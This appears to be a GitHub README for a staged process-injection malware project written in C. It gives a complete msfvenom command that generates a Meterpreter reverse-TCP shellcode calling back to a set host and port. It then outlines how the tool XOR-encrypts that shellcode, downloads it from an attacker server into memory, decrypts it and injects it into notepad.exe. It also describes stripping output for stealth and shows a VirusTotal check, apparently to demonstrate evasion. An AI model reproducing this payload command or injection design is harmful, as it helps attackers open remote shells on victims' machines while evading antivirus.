# Staged-Process-Injection-C
## Staged Process Injector with obfuscation Techniques including the Native API and offsets
### STAGE 0 ---> preparation

-Generatad payload with msfvenom
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f raw exitfunc=thread -o clear_code.bin

-Then I wrote a C program to XOR encrypt the bin file and write it out to an another file called "enc_code.bin"
    
### STAGE 1 --> connecting to server

-The malware connects to the attacker's server and downloads the encrypted shellcode "enc_code.bin".

-The encrypted shellcode is downloaded in memory.

### STAGE 2 --> Decryption

-It utilizes XOR decryption to decrypt the shellcode "enc_code.bin" in memory

### STAGE 3 --> Process Injection

-Then it enumerates all the processes in the system and searches for notepad.exe (you can change that in the enum_processes() function).

-The malware then injects the decrypted shellcode into the target process.


### EXECUTION

-I commented out most the printf statements to make it stealthier, you can uncomment them in the code and see the details.


![image](https://github.com/user-attachments/assets/6867d463-5a04-4c9d-9bbb-2328c46dc667)

![image](https://github.com/user-attachments/assets/28c4c66f-8a0e-42fd-b72f-fdc567b911d5)

![image](https://github.com/user-attachments/assets/b2b62806-0478-4f2d-ad48-92ee4f27932e)


### VirusTotal Analysis

![image](https://github.com/user-attachments/assets/dd34426d-d677-40fb-9864-1f6025d225e7)

